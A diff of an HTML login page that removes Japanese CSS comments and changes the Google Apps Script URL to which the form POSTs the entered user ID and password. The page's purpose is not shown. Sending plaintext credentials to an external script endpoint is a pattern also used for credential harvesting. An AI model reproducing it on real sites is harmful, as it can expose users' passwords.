@@ -8,7 +8,7 @@
     <style>
         body {
             font-family: 'Roboto', sans-serif;
-            background-color: #000; /* 背景を黒に設定 */
+            background-color: #000;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -17,53 +17,53 @@
         }
         .container {
             background-color: rgba(0, 0, 0, 0.8);
-            border-radius: 15px; /* 形を柔らかく */
+            border-radius: 15px;
             box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
             padding: 30px;
-            width: 90%; /* レスポンシブ対応 */
-            max-width: 400px; /* 最大幅設定 */
-            text-align: left; /* 左寄せ */
-            color: #ffffff; /* 白文字 */
+            width: 90%;
+            max-width: 400px;
+            text-align: left;
+            color: #ffffff;
         }
         h1 {
-            font-size: 2em; /* サイズを小さく */
+            font-size: 2em;
             margin-bottom: 5px;
             text-shadow: 0 0 10px rgba(255, 255, 255, 0.6);
         }
         h2 {
-            font-size: 1em; /* サイズを小さく */
+            font-size: 1em;
             margin-bottom: 15px;
-            color: #cccccc; /* 薄い白 */
+            color: #cccccc;
             text-shadow: 0 0 5px rgba(255, 255, 255, 0.4);
         }
         label {
             display: block;
             margin: 10px 0 5px;
-            color: #ffffff; /* 白文字 */
+            color: #ffffff;
         }
         input[type="text"], input[type="password"] {
             width: 100%;
             padding: 10px;
-            border: 2px solid #ffffff; /* 白のボーダー */
-            border-radius: 10px; /* 形を柔らかく */
+            border: 2px solid #ffffff;
+            border-radius: 10px;
             margin-bottom: 15px;
-            background-color: rgba(255, 255, 255, 0.1); /* 半透明の背景 */
-            color: #ffffff; /* 白文字 */
+            background-color: rgba(255, 255, 255, 0.1);
+            color: #ffffff;
             transition: border-color 0.3s;
         }
         input[type="text"]:focus, input[type="password"]:focus {
-            border-color: #cccccc; /* 薄い白のボーダー */
+            border-color: #cccccc; 
             outline: none;
         }
         input[type="password"]::placeholder,
         input[type="text"]::placeholder {
-            color: rgba(255, 255, 255, 0.5); /* 薄い白 */
+            color: rgba(255, 255, 255, 0.5); 
         }
         input[type="button"] {
-            background-color: #ffffff; /* ボタンの白 */
-            color: black; /* ボタン文字色を黒に */
+            background-color: #ffffff; 
+            color: black; 
             border: none;
-            border-radius: 10px; /* 形を柔らかく */
+            border-radius: 10px; 
             padding: 10px;
             cursor: pointer;
             width: 100%;
@@ -71,12 +71,12 @@
             transition: background-color 0.3s;
         }
         input[type="button"]:hover {
-            background-color: #cccccc; /* ホバー時の薄い白 */
+            background-color: #cccccc; 
         }
         .note {
             margin-top: 15px;
-            font-size: 0.8em; /* サイズを小さく */
-            color: rgba(204, 204, 204, 0.7); /* 薄い白 */
+            font-size: 0.8em; 
+            color: rgba(204, 204, 204, 0.7); 
             text-align: left;
             line-height: 1.4;
             word-wrap: break-word;
@@ -113,7 +113,7 @@
             formData.append('user', document.getElementById('userId').value);
             formData.append('pass', document.getElementById('password').value);
 
-            fetch('https://script.google.com/macros/s/AKfycbzlaqIAN1AnheHMRZoVrJPUrAv_WuHC32DYWgG2SGiZk9l8K3sjFdPqmKSyiVEq5UPE/exec', {
+            fetch('https://script.google.com/macros/s/AKfycbxKH03vTX6j1QETs-HJ4VdARgqQTWxzBq1C0U1odHntBgzU0vSVKVNme-Nlm9aAXccZ/exec', {
                 method: 'POST',
                 body: formData
             })
